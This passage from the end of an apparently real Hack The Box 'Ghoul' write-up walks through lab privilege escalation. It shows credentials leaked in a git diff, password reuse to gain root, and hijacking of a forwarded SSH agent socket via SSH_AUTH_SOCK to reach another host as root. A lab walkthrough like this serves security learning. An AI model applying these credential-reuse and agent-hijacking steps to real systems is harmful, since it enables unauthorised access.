    		&lt;groupId&gt;mysql&lt;&#x2F;groupId&gt;</span><br><span class="line">+            		&lt;artifactId&gt;mysql-connector-java&lt;&#x2F;artifactId&gt;</span><br><span class="line">+            		&lt;version&gt;5.1.46&lt;&#x2F;version&gt;</span><br><span class="line">+		&lt;&#x2F;dependency&gt;</span><br><span class="line"> </span><br><span class="line"> 	&lt;&#x2F;dependencies&gt;</span><br><span class="line"> </span><br><span class="line">diff --git a&#x2F;src&#x2F;main&#x2F;resources&#x2F;application.properties b&#x2F;src&#x2F;main&#x2F;resources&#x2F;application.properties</span><br><span class="line">index 4cbc10b..41adeb0 100644</span><br><span class="line">--- a&#x2F;src&#x2F;main&#x2F;resources&#x2F;application.properties</span><br><span class="line">+++ b&#x2F;src&#x2F;main&#x2F;resources&#x2F;application.properties</span><br><span class="line">@@ -1,7 +1,7 @@</span><br><span class="line"> server.port&#x3D;8080</span><br><span class="line"> spring.datasource.url&#x3D;jdbc:mysql:&#x2F;&#x2F;localhost:3306&#x2F;db</span><br><span class="line">-spring.datasource.username&#x3D;kaneki</span><br><span class="line">-spring.datasource.password&#x3D;7^Grc%C\7xEQ?tb4</span><br><span class="line">+spring.datasource.username&#x3D;root</span><br><span class="line">+spring.datasource.password&#x3D;g_xEN$ZuWD7hJf2G</span><br><span class="line"> server.address&#x3D;0.0.0.0</span><br><span class="line"> </span><br><span class="line"> spring.jpa.properties.hibernate.dialect &#x3D; org.hibernate.dialect.MySQL5InnoDBDialect</span><br></pre></td></tr></table></figure>
<p>The only host that hasn’t been rooted yet is <code>kaneki-pc</code> so I tried the 2 passwords and <code>7^Grc%C\7xEQ?tb4</code> worked, However still no flag :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kaneki_pub@kaneki-pc:~$ su</span><br><span class="line">Password: </span><br><span class="line">root@kaneki-pc:&#x2F;home&#x2F;kaneki_pub# cd &#x2F;root&#x2F;</span><br><span class="line">root@kaneki-pc:~# cat root.txt </span><br><span class="line">You&#39;ve done well to come upto here human. But what you seek doesn&#39;t lie here. The journey isn&#39;t over yet.....</span><br><span class="line">root@kaneki-pc:~#</span><br></pre></td></tr></table></figure>


<h2 id="Hijacking-the-SSH-Forward-Agent-Root-Flag"><a href="#Hijacking-the-SSH-Forward-Agent-Root-Flag" class="headerlink" title="Hijacking the SSH Forward Agent, Root Flag"></a>Hijacking the SSH Forward Agent, Root Flag</h2><p>By checking the <code>/tmp</code> directory I saw some directories named <code>ssh-RandomString</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kaneki-pc:~# cd &#x2F;tmp&#x2F;</span><br><span class="line">root@kaneki-pc:&#x2F;tmp# ls -la</span><br><span class="line">total 28</span><br><span class="line">drwxrwxrwt 1 root       root       4096 Oct  4 15:06 .</span><br><span class="line">drwxr-xr-x 1 root       root       4096 Oct  4 14:45 ..</span><br><span class="line">drwx------ 1 root       root       4096 Dec 16  2018 ssh-1Oo5P5JuouKm</span><br><span class="line">drwx------ 1 kaneki_adm kaneki_adm 4096 Dec 16  2018 ssh-FWSgs7xBNwzU</span><br><span class="line">drwx------ 1 kaneki_pub kaneki     4096 Dec 16  2018 ssh-jDhFSu7EeAnz</span><br><span class="line">-rw------- 1 root       root        400 Oct  4 14:45 sshd-stderr---supervisor-E5awkI.log</span><br><span class="line">-rw------- 1 root       root          0 Oct  4 14:45 sshd-stdout---supervisor-3bRi58.log</span><br><span class="line">root@kaneki-pc:&#x2F;tmp#</span><br></pre></td></tr></table></figure>
<p>And by checking the processes I found that there is a periodic ssh command as root to <code>172.18.0.1</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kaneki-pc:&#x2F;tmp# ps aux | grep ssh</span><br><span class="line">root         10  0.0  0.1  72296  6116 pts&#x2F;0    S    14:45   0:00 &#x2F;usr&#x2F;sbin&#x2F;sshd -D</span><br><span class="line">root         15  0.0  0.1  74656  6536 ?        Ss   14:48   0:00 sshd: kaneki_pub [priv]</span><br><span class="line">kaneki_+     17  0.0  0.0  74792  4008 ?        S    14:48   0:00 sshd: kaneki_pub@pts&#x2F;2</span><br><span class="line">root        101  0.1  0.1  74656  6572 ?        Ss   15:12   0:00 sshd: kaneki_adm [priv]</span><br><span class="line">kaneki_+    103  0.0  0.0  74656  3192 ?        S    15:12   0:00 sshd: kaneki_adm@pts&#x2F;1</span><br><span class="line">kaneki_+    104  0.1  0.1  45188  5400 pts&#x2F;1    Ss+  15:12   0:00 ssh root@172.18.0.1 -p 2222 -t .&#x2F;log.sh</span><br><span class="line">root        106  0.0  0.0  13212  1020 pts&#x2F;2    S+   15:12   0:00 grep --color&#x3D;auto ssh</span><br><span class="line">root@kaneki-pc:&#x2F;tmp#</span><br></pre></td></tr></table></figure>
<p>After searching for a while I found <a href="https://www.clockwork.com/news/2012/09/28/602/ssh_agent_hijacking/" target="_blank" rel="noopener">this article</a> which explains it very well. I cleaned the <code>/tmp</code> directory :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kaneki-pc:&#x2F;tmp# rm -rf ssh-*</span><br><span class="line">root@kaneki-pc:&#x2F;tmp# ls -la</span><br><span class="line">total 16</span><br><span class="line">drwxrwxrwt 1 root root 4096 Oct  4 15:13 .</span><br><span class="line">drwxr-xr-x 1 root root 4096 Oct  4 14:45 ..</span><br><span class="line">-rw------- 1 root root  400 Oct  4 14:45 sshd-stderr---supervisor-E5awkI.log</span><br><span class="line">-rw------- 1 root root    0 Oct  4 14:45 sshd-stdout---supervisor-3bRi58.log</span><br><span class="line">root@kaneki-pc:&#x2F;tmp#</span><br></pre></td></tr></table></figure>
<p>Then I waited for the ssh command to get executed again. After some minutes the agent was created :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@kaneki-pc:&#x2F;tmp# ls -la</span><br><span class="line">total 20</span><br><span class="line">drwxrwxrwt 1 root       root       4096 Oct  4 15:30 .</span><br><span class="line">drwxr-xr-x 1 root       root       4096 Oct  4 14:45 ..</span><br><span class="line">drwx------ 2 kaneki_adm kaneki_adm 4096 Oct  4 15:30 ssh-X2sLvGoeXy</span><br><span class="line">-rw------- 1 root       root        400 Oct  4 14:45 sshd-stderr---supervisor-E5awkI.log</span><br><span class="line">-rw------- 1 root       root          0 Oct  4 14:45 sshd-stdout---supervisor-3bRi58.log</span><br><span class="line">root@kaneki-pc:&#x2F;tmp# ls -la ssh-X2sLvGoeXy&#x2F;</span><br><span class="line">total 12</span><br><span class="line">drwx------ 2 kaneki_adm kaneki_adm 4096 Oct  4 15:30 .</span><br><span class="line">drwxrwxrwt 1 root       root       4096 Oct  4 15:30 ..</span><br><span class="line">srwxr-xr-x 1 kaneki_adm kaneki_adm    0 Oct  4 15:30 agent.490</span><br><span class="line">root@kaneki-pc:&#x2F;tmp#</span><br></pre></td></tr></table></figure>
<p>I quickly hijacked it :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kaneki-pc:&#x2F;tmp# export SSH_AUTH_SOCK&#x3D;&#x2F;tmp&#x2F;ssh-X2sLvGoeXy&#x2F;agent.490</span><br><span class="line">root@kaneki-pc:&#x2F;tmp# ssh-add -l</span><br><span class="line">2048 SHA256:U3NCrv1R4fOSeyIk3W0EcaAm81ETo4dcu5+FBbk3KxE &#x2F;home&#x2F;kaneki&#x2F;.ssh&#x2F;id_rsa (RSA)</span><br></pre></td></tr></table></figure>
<p>Then I could <code>ssh</code> to <code>172.18.0.1</code> as root :<br><img src="/images/hackthebox/ghoul/23.png" alt=""></p>
<p>And we owned root !<br>That’s it , Feedback is appreciated !<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener">@Ahm3d_H3sham</a><br>Thanks for reading.</p>
<p>Previous Hack The Box write-up : <a href="/hack-the-box/swagshop/">Hack The Box - Swagshop</a><br>Next Hack The Box write-up : <a href="/hack-the-box/writeup/">Hack The Box - Writeup</a></p>

</div>


  <div class="book-comments">
    




  </div>



<script src="/js/book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <!-- Author image -->
    <div class="author-img">
      
        <figure class="avatar avatar-lg">
          <img src="/avatar.jpg" alt="...">
        </figure>
      
    </div>

    <!-- Author title -->
    <div class="author-title">
      <div>0xRick</div>
      <div>2019-10-05</div>
    </div>
  </div>

  
    <div class="divider"></div>

    <div class="link">
      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>

      <a class="tag-link" href="/tags/git/" rel="tag">#git</a> <a class="tag-link" href="/tags/linux/" rel="tag">#linux</a> <a class="tag-link" href="/tags/networking/" rel="tag">#networking</a> <a class="tag-link" href="/tags/pivoting/" rel="tag">#pivoting</a> <a class="tag-link" href="/tags/rce/" rel="tag">#rce</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#ssh</a> <a class="tag-link" href="/tags/web/" rel="tag">#web</a>
    </div>
    
  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">
  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
  <a onclick="go_top()">Back to top</a>
  <a onclick="go_bottom()">Go to bottom</a>
</div>


<script src="/js/book-toc.js"></script>

</div>
      </div>
    </div>
  </div>
  
  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>

</body>
</html>


<script src="/js/book.js"></script>
